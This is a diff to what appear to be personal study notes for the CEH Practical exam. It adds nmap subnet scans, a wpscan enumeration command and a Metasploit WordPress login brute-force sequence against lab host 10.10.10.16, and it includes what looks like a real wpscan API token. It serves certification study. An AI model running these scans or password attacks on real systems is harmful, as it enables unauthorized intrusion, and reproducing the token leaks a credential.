@@ -1,6 +1,11 @@
 
 Any doubt refere this > https://github.com/deFr0ggy/CEH-Practical-Preparation-Commands-Tools
 Detail note: every domain: https://github.com/admarnelson/CEH-V11-Practical/blob/main/Notes%20CEH
+
+
+ - nmap -sn -PR 192.168.1.1/24 -oN ip.txt
+ - nmap -A -T4 -vv -iL ip.txt -oN nmap.txt 
+ - nmap -sU -sV -A -T4 -v -oN udp.tx
 --------------------------------------------------------------------
 
 1.     Download zip file
@@ -155,6 +160,25 @@ Rest
                             4.set LHOST
                             5.set LPORT 4444
                             6.exploit
+
+
+
+Wordpress
+
+			wpscan --api-token VvfZGlexuy9TyGjG0EaDiDOPlYDrjtdFTgPPDwQdZhU --url http://10.10.10.16:8080/CEH --plugins-detection aggressive --enumerate u
+
+			service postgresql start
+			msfconsole
+			use auxiliary/scanner/http/wordpress_login_enum
+			show options
+			set PASS_FILE password.txt
+			set RHOST 10.10.10.16
+			set RPORT 8080
+			set TARGETURI http://10.10.10.16:8080/CEH
+			set USERNAME admin
+			run
+			Find the credential
+
 
 6. SQL INJECTION
 
